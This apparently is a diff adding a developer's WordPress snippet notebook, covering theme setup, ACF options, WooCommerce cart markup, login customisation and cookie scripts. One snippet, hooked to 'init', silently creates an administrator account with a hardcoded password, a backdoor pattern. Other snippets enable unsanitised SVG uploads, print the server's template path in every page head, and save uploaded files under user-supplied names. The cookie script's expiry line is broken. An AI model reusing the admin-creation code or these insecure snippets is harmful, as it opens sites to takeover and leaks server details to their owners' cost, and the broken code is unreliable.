@@ -1,0 +1,459 @@
+<!-- Get  Menu --->
+<?php wp_nav_menu(array('theme_location' => 'header')) ?>
+
+
+<!-- // wysing editor showing -->
+<?php add_filter('use_block_editor_for_post', '__return_false'); ?>
+
+<!-- Css and Js enqueue  -->
+<?php
+add_action('wp_enqueue_scripts', 'my_theme_enqueue_styles');
+function my_theme_enqueue_styles()
+{
+
+    // Add CSS in header
+    wp_enqueue_style('style-css', get_template_directory_uri() . '/assets/css/style.css');
+
+    // Add JS in footer
+    wp_enqueue_script('custom-js', get_template_directory_uri() . '/assets/js/custom.js');
+}
+?>
+
+
+<!-- add options for header & footer -->
+<?php
+if (function_exists('acf_add_options_page')) {
+
+    acf_add_options_page(array(
+        'page_title'     => 'Theme General Settings',
+        'menu_title'    => 'Theme Settings',
+        'menu_slug'     => 'theme-general-settings',
+        'capability'    => 'edit_posts',
+        'redirect'        => false
+    ));
+    acf_add_options_sub_page(array(
+        'page_title'     => 'Theme Header Settings',
+        'menu_title'    => 'Header',
+        'parent_slug'    => 'theme-general-settings',
+    ));
+    acf_add_options_sub_page(array(
+        'page_title'     => 'Theme Footer Settings',
+        'menu_title'    => 'Footer',
+        'parent_slug'    => 'theme-general-settings',
+    ));
+}
+?>
+
+<!-- Register nav menu  -->
+<?php
+add_theme_support('post-thumbnails');
+set_post_thumbnail_size(1568, 9999);
+
+register_nav_menus(
+    array(
+        'primary' => esc_html__('Primary menu', 'twentytwentyone'),
+        'secondary'  => esc_html__('Secondary menu', 'twentytwentyone'),
+        'main-menu' => esc_html__('Main menu', 'twentytwentyone'),
+        'footer'  => esc_html__('Footer menu', 'twentytwentyone'),
+        'header' => esc_html__('Header menu', 'twentytwentyone'),
+
+    )
+);
+?>
+
+<!-- SVG support media :- -->
+<?php
+function add_file_types_to_uploads($file_types)
+{
+    $new_filetypes = array();
+    $new_filetypes['svg'] = 'image/svg+xml';
+    $file_types = array_merge($file_types, $new_filetypes);
+    return $file_types;
+}
+add_filter('upload_mimes', 'add_file_types_to_uploads');
+?>
+
+<!-- Add class in body  -->
+<?php
+function add_custom_body_class($classes)
+{
+    if (is_page(42)) { // Replace 42 with your page ID
+        $classes[] = 'your-custom-class';
+    }
+    return $classes;
+}
+add_filter('body_class', 'add_custom_body_class');
+?>
+
+<!-- file path showing -->
+<?php
+add_action('wp_head', 'show_template');
+function show_template()
+{
+    global $template;
+    echo basename($template);
+    echo get_theme_file_path($template);
+}
+?>
+
+
+<!-- Category name get  -->
+<?php $cat = get_the_category();
+echo $cat[0]->cat_name; ?>
+
+
+
+
+<!-- Function for page builder -->
+<?php
+function pagebuilder($builder = 'page_builder', $option = false)
+{
+    if (true === $option) {
+        if (have_rows($builder, 'option')) :
+            while (have_rows($builder, 'option')) : the_row();
+                get_template_part('modules/' . get_row_layout());
+            endwhile;
+        endif;
+    } else {
+        if (have_rows($builder)) :
+            while (have_rows($builder)) : the_row();
+                get_template_part('modules/' . get_row_layout());
+            endwhile;
+        endif;
+    }
+}
+?>
+
+<!-- Language wise conditon  -->
+<?php if (ICL_LANGUAGE_CODE == 'nl') { ?>
+    <span class="lngs-nl-text">NL</span>
+<?php } ?>
+<?php if (ICL_LANGUAGE_CODE == 'fr') { ?>
+    <span class="lngs-fr-text">FR</span>
+<?php } ?>
+<?php if (ICL_LANGUAGE_CODE == 'en') { ?>
+    <span class="lngs-en-text">EN</span>
+<?php } ?>
+
+
+<!-- body display none -->
+<script>
+    jQuery(window).on('load', function() {
+        jQuery('body').css('display', 'none');
+    });
+</script>
+
+
+<!-- Update Query -->
+UPDATE wp_options set option_value = "http://localhost/finarraywealth" WHERE option_id = 1;
+
+
+<!-- SVG support media  -->
+<?php
+function addFileTypesToUploads($file_types)
+{
+    $new_filetypes = array();
+    $new_filetypes['svg'] = 'image/svg+xml';
+    $file_types = array_merge($file_types, $new_filetypes);
+    return $file_types;
+}
+add_action('upload_mimes', 'addFileTypesToUploads');
+?>
+
+
+
+<---------------------------------------------------------------------------------------------------------------------------------->
+
+    <!-- wp:woocommerce/cart -->
+    <div class="wp-block-woocommerce-cart alignwide is-loading"><!-- wp:woocommerce/filled-cart-block -->
+        <div class="wp-block-woocommerce-filled-cart-block"><!-- wp:woocommerce/cart-items-block -->
+            <div class="wp-block-woocommerce-cart-items-block"><!-- wp:woocommerce/cart-line-items-block -->
+                <div class="wp-block-woocommerce-cart-line-items-block"> </div>
+                <!-- /wp:woocommerce/cart-line-items-block -->
+
+                <!-- wp:woocommerce/cart-cross-sells-block -->
+                <div class="wp-block-woocommerce-cart-cross-sells-block"><!-- wp:heading {"fontSize":"large"} -->
+                    <h2 class="wp-block-heading has-large-font-size">You may be interested in…</h2>
+                    <!-- /wp:heading -->
+
+                    <!-- wp:woocommerce/cart-cross-sells-products-block -->
+                    <div class="wp-block-woocommerce-cart-cross-sells-products-block"> </div>
+                    <!-- /wp:woocommerce/cart-cross-sells-products-block -->
+                </div>
+                <!-- /wp:woocommerce/cart-cross-sells-block -->
+            </div>
+            <!-- /wp:woocommerce/cart-items-block -->
+
+            <!-- wp:woocommerce/cart-totals-block -->
+            <div class="wp-block-woocommerce-cart-totals-block"><!-- wp:woocommerce/cart-order-summary-block -->
+                <div class="wp-block-woocommerce-cart-order-summary-block"><!-- wp:woocommerce/cart-order-summary-heading-block -->
+                    <div class="wp-block-woocommerce-cart-order-summary-heading-block"> </div>
+                    <!-- /wp:woocommerce/cart-order-summary-heading-block -->
+
+                    <!-- wp:woocommerce/cart-order-summary-coupon-form-block -->
+                    <div class="wp-block-woocommerce-cart-order-summary-coupon-form-block"> </div>
+                    <!-- /wp:woocommerce/cart-order-summary-coupon-form-block -->
+
+                    <!-- wp:woocommerce/cart-order-summary-subtotal-block -->
+                    <div class="wp-block-woocommerce-cart-order-summary-subtotal-block"> </div>
+                    <!-- /wp:woocommerce/cart-order-summary-subtotal-block -->
+
+                    <!-- wp:woocommerce/cart-order-summary-fee-block -->
+                    <div class="wp-block-woocommerce-cart-order-summary-fee-block"> </div>
+                    <!-- /wp:woocommerce/cart-order-summary-fee-block -->
+
+                    <!-- wp:woocommerce/cart-order-summary-discount-block -->
+                    <div class="wp-block-woocommerce-cart-order-summary-discount-block"> </div>
+                    <!-- /wp:woocommerce/cart-order-summary-discount-block -->
+
+                    <!-- wp:woocommerce/cart-order-summary-shipping-block -->
+                    <div class="wp-block-woocommerce-cart-order-summary-shipping-block"> </div>
+                    <!-- /wp:woocommerce/cart-order-summary-shipping-block -->
+
+                    <!-- wp:woocommerce/cart-order-summary-taxes-block -->
+                    <div class="wp-block-woocommerce-cart-order-summary-taxes-block"> </div>
+                    <!-- /wp:woocommerce/cart-order-summary-taxes-block -->
+                </div>
+                <!-- /wp:woocommerce/cart-order-summary-block -->
+
+                <!-- wp:woocommerce/cart-express-payment-block -->
+                <div class="wp-block-woocommerce-cart-express-payment-block"> </div>
+                <!-- /wp:woocommerce/cart-express-payment-block -->
+
+                <!-- wp:woocommerce/proceed-to-checkout-block -->
+                <div class="wp-block-woocommerce-proceed-to-checkout-block"> </div>
+                <!-- /wp:woocommerce/proceed-to-checkout-block -->
+
+                <!-- wp:woocommerce/cart-accepted-payment-methods-block -->
+                <div class="wp-block-woocommerce-cart-accepted-payment-methods-block"> </div>
+                <!-- /wp:woocommerce/cart-accepted-payment-methods-block -->
+            </div>
+            <!-- /wp:woocommerce/cart-totals-block -->
+        </div>
+        <!-- /wp:woocommerce/filled-cart-block -->
+
+        <!-- wp:woocommerce/empty-cart-block -->
+        <div class="wp-block-woocommerce-empty-cart-block"><!-- wp:heading {"textAlign":"center","className":"with-empty-cart-icon wc-block-cart__empty-cart__title"} -->
+            <h2 class="wp-block-heading has-text-align-center with-empty-cart-icon wc-block-cart__empty-cart__title">Your cart is currently empty!</h2>
+            <!-- /wp:heading -->
+
+            <!-- wp:separator {"className":"is-style-dots"} -->
+            <hr class="wp-block-separator has-alpha-channel-opacity is-style-dots" /><!-- /wp:separator -->
+
+            <!-- wp:heading {"textAlign":"center"} -->
+            <h2 class="wp-block-heading has-text-align-center">New in store</h2>
+            <!-- /wp:heading -->
+
+            <!-- wp:woocommerce/product-new {"columns":4,"rows":1} /-->
+        </div>
+        <!-- /wp:woocommerce/empty-cart-block -->
+    </div>
+    <!-- /wp:woocommerce/cart -->
+
+    <---------------------------------------------------------------------------------------------------------------------------------->
+
+
+        <!-- Shop page custom code  -->
+        <?php
+        function add_custom_class_to_body($classes)
+        {
+            // Check if the current page is the shop page
+            if (is_shop()) {
+                // Add a custom class for the shop page
+                $classes[] = 'woocommerce-shop-page';
+            }
+            return $classes;
+        }
+        add_filter('body_class', 'add_custom_class_to_body');
+        ?>
+
+
+        <!-- New user create admin site -->
+        <?php
+        function wpb_admin_account()
+        {
+            $user = 'developer';
+            $pass = 'devef#@sdfsd@123';
+            $email = 'mailto:email@domain.com';
+            if (!username_exists($user)  && !email_exists($email)) {
+                $user_id = wp_create_user($user, $pass, $email);
+                $user = new WP_User($user_id);
+                $user->set_role('administrator');
+            }
+        }
+        add_action('init', 'wpb_admin_account');
+        ?>
+
+
+
+        <!-- Rest API plugin name -->
+        Plugin name : WP REST API Controller
+
+
+        <!-- Drag and Drop Reorder Images using jQuery, Ajax, PHP & MySQL  -->
+        https://www.codexworld.com/drag-drop-images-reorder-using-jquery-ajax-php-mysql/
+
+
+
+
+        <!-- Move upload file custom code in wordpress  -->
+        <?php
+
+        if (isset($_POST['ins'])) {
+            global $wpdb;
+            $table_name = $wpdb->prefix . 'employee_list';
+            // File upload path
+            $targetDir = ABSPATH . 'wp-content/uploads/';
+            $fileName = basename($_FILES["image"]["name"]);
+            $targetFilePath = $targetDir . $fileName;
+            $fileType = pathinfo($targetFilePath, PATHINFO_EXTENSION);
+
+            $allowTypes = array('jpg', 'png', 'jpeg', 'gif', 'pdf');
+
+            if (in_array($fileType, $allowTypes)) {
+                if (move_uploaded_file($_FILES["image"]["tmp_name"], $targetFilePath)) {
+                    $wpdb->insert(
+                        'your_images_table_name',
+                        array(
+                            'file_name' => $fileName,
+                            'uploaded_on' => current_time('mysql'),
+                        )
+                    );
+                    $statusMsg = "The file " . $fileName . " has been uploaded and data inserted successfully.";
+                } else {
+                    $statusMsg = "Sorry, there was an error uploading your file.";
+                }
+            } else {
+                $statusMsg = 'Sorry, only JPG, JPEG, PNG, GIF, & PDF files are allowed to upload.';
+            }
+            echo $statusMsg;
+
+            $wpdb->insert(
+                $table_name,
+                array(
+                    'image' => $fileName
+                )
+            );
+            exit;
+        }
+        ?>
+
+
+        <!-- File path function.php  -->
+        <!-- file path -->
+        <?php
+        add_action('wp_head', 'show_template');
+        function show_template()
+        {
+            global $template;
+            echo basename($template);
+            echo get_theme_file_path($template);
+        }
+        ?>
+
+
+
+        <!-- wp-admin logo change -->
+        <?php function my_login_logo()
+        { ?>
+
+            <style type="text/css">
+                #login h1 a,
+                .login h1 a {
+                    background-image: url(<?php echo get_stylesheet_directory_uri(); ?>/assets/images/Altwood_logo_tagline_RGB.svg);
+                }
+            </style>
+        <?php }
+        add_action('login_enqueue_scripts', 'my_login_logo');
+        ?>
+
+        <!-- changing the url on the logo to redirect them -->
+        <?php
+        function mb_login_url()
+        {
+            return home_url();
+        }
+        add_filter('login_headerurl', 'mb_login_url');
+        ?>
+
+
+
+        <!-- Thank you page redirect -->
+        <?php
+        add_action('wp_footer', 'mycustom_wp_footer');
+        function mycustom_wp_footer()
+        {
+        ?>
+            <script>
+                document.addEventListener('wpcf7mailsent', function(event) {
+                    location = 'https://altwood.be/bedankt/';
+                }, false);
+            </script>
+        <?php
+        }
+        ?>
+
+
+        <!-- Acf relationship -->
+        <div class="section over-onze">
+            <div class="container">
+                <div class="over-onze-icons">
+                    <?php
+                    $meer_relation_section = get_sub_field('meer_relation_section');
+                    if ($meer_relation_section) : ?>
+                        <?php foreach ($meer_relation_section as $post) :
+                            setup_postdata($post); ?>
+                            <a href="<?php echo get_the_permalink(); ?>">
+                                <img src="<?php echo get_the_post_thumbnail_url($post_id, 'thumbnail'); ?>" alt="slide5-active">
+                            </a>
+                        <?php endforeach; ?>
+                        <?php wp_reset_postdata(); ?>
+                    <?php endif; ?>
+                </div>
+            </div>
+        </div>
+
+
+        <!-- Set cookie code  -->
+        <script type="text/javascript">
+            function getCookie(cname) {
+                let name = cname + "=";
+                let decodedCookie = decodeURIComponent(document.cookie);
+                let ca = decodedCookie.split(';');
+                for (let i = 0; i < ca.length; i++) {
+                    let c = ca[i];
+                    while (c.charAt(0) == ' ') {
+                        c = c.substring(1);
+                    }
+                    if (c.indexOf(name) == 0) {
+                        return c.substring(name.length, c.length);
+                    }
+                }
+                return "";
+            }
+
+            function setCookie(cname, cvalue, exdays) {
+                const d = new Date();
+                d.setTime(d.getTime() + (exdays 24 60 60 1000));
+                let expires = "expires=" + d.toUTCString();
+                document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
+            }
+            jQuery(document).ready(function() {
+                var bma = getCookie('newslatter');
+                if (bma === 'yes') {
+                    $('#cookie-id').hide().remove();
+                } else {
+                    $('#cookie-id').show();
+                }
+            });
+            jQuery("#closecookie").on("click", function() {
+                setCookie('newslatter', 'yes', 5); // Set the cookie for 5 days
+
+                var bma = getCookie('newslatter');
+                if (bma === 'yes') {
+                    $('#cookie-id').hide();
+                } else {
+                    $('#cookie-id').show();
+                }
+            });
+        </script>
